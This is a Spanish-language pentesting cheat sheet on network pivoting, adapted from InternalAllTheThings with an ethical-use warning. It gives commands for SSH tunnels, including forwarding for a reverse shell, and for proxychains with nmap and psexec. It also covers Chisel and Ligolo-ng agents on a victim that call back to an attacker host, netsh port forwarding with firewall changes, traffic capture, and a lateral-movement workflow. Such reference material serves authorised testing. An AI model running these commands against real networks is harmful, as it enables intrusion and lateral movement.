---
tags:
  - post-explotacion
  - pivoting
  - tunneling
  - pentesting
fuente: "https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/"
licencia: MIT
---

# Pivoting de Red

> [!warning] Uso ético y autorizado. Ver [[📜 Fuentes y Licencias]].

Técnicas para acceder a redes internas a través de un host comprometido.

---

## SSH (nativo)

| Técnica | Comando |
|---------|---------|
| Local Port Forwarding | `ssh -L <local_port>:<dst_host>:<dst_port> user@pivot` |
| Remote Port Forwarding | `ssh -R <remote_port>:<local_host>:<local_port> user@pivot` |
| SOCKS Proxy dinámico | `ssh -N -f -D <local_port> user@pivot` |

```bash
# Acceder a RDP interno (192.168.1.10:3389) a través del pivot
ssh -L 3389:192.168.1.10:3389 user@pivot_ip

# Exponer puerto local 4444 en el pivot (reverse shell)
ssh -R 4444:127.0.0.1:4444 user@pivot_ip

# SOCKS5 en puerto 1080 (proxychains)
ssh -N -D 1080 user@pivot_ip

# Agregar forwarding en sesión SSH ya abierta
~C
-L 8080:192.168.1.10:80
```

---

## Proxychains

```bash
# Configurar /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080   # apunta al SOCKS creado con SSH -D

# Usar cualquier herramienta a través del pivot
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://192.168.1.10
proxychains impacket-psexec administrator@192.168.1.10
```

> [!tip] Descomentar `proxy_dns` en proxychains.conf para que las resoluciones DNS también pasen por el proxy.

---

## Chisel (TCP/UDP tunnel sobre HTTP/S)

```bash
# En el atacante (servidor)
./chisel server -p 8080 --reverse

# En la víctima (cliente) → expone SOCKS5 en atacante:1080
./chisel client <LHOST>:8080 R:socks

# Forwarding de puerto específico
./chisel client <LHOST>:8080 R:3389:192.168.1.10:3389

# Con TLS
./chisel server --tls-key key.pem --tls-cert cert.pem -p 8443 --reverse
./chisel client --tls-skip-verify https://<LHOST>:8443 R:socks
```

---

## Ligolo-ng (recomendado para redes internas grandes)

```bash
# Atacante: levantar proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Víctima: conectar agente
./agent -connect <LHOST>:11601 -ignore-cert

# En la consola de ligolo-ng
session                    # seleccionar sesión
start                      # iniciar túnel

# Agregar ruta hacia la red interna (atacante)
sudo ip route add 192.168.1.0/24 dev ligolo
```

---

## Netsh (Windows — sin herramientas externas)

```powershell
# Forward puerto local → red interna
netsh interface portproxy add v4tov4 `
  listenport=3389 listenaddress=0.0.0.0 `
  connectport=3389 connectaddress=192.168.1.10

# Abrir firewall
netsh advfirewall firewall add rule name="FWD 3389" dir=in action=allow protocol=TCP localport=3389

# Ver reglas activas
netsh interface portproxy show all

# Eliminar regla
netsh interface portproxy delete v4tov4 listenport=3389
```

---

## Captura de tráfico en el pivot

```bash
# tcpdump
tcpdump -w captura.pcap -i eth0
tcpdump -A -i eth0 port 80

# netsh (Windows)
netsh trace start capture=yes tracefile=C:\trace.etl maxsize=512
netsh trace stop
# Convertir: etl2pcapng.exe trace.etl trace.pcapng
```

---

## graftcp (proxificar apps Go)

```bash
# Levantar SOCKS5 con chisel/SSH primero
graftcp-local -listen :2233 -socks5 127.0.0.1:1080
graftcp ./nuclei -u http://192.168.1.10
```

---

## Tabla de herramientas

| Herramienta | Protocolo | Plataforma | Caso de uso |
|-------------|-----------|------------|-------------|
| SSH -D | SOCKS5 | Linux/Mac | Acceso general si hay SSH |
| Chisel | HTTP/S | Win/Lin | Sin SSH, firewall HTTP |
| Ligolo-ng | TCP | Win/Lin | Redes internas grandes |
| Netsh | TCP | Windows | Sin herramientas externas |
| Proxychains | SOCKS | Linux | Proxificar cualquier tool |
| graftcp | SOCKS | Linux | Herramientas Go |

---

## Flujo de trabajo típico

```
1. Comprometer host pivot (acceso inicial)
2. Subir chisel/ligolo-ng o usar SSH
3. Crear túnel SOCKS5 hacia red interna
4. Configurar proxychains con el SOCKS5
5. Escanear red interna: proxychains nmap -sT ...
6. Moverse lateralmente con las credenciales/hashes obtenidos
```

---

## Referencias
- [[🗺️ MOC Ciberseguridad y Redes]]
- [[Escalada de Privilegios Linux]]
- [[Escalada de Privilegios Windows]]
- [[Persistencia Post-Explotación]]
- [[Active Directory — Ataques]]
- Fuente: [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/) — MIT
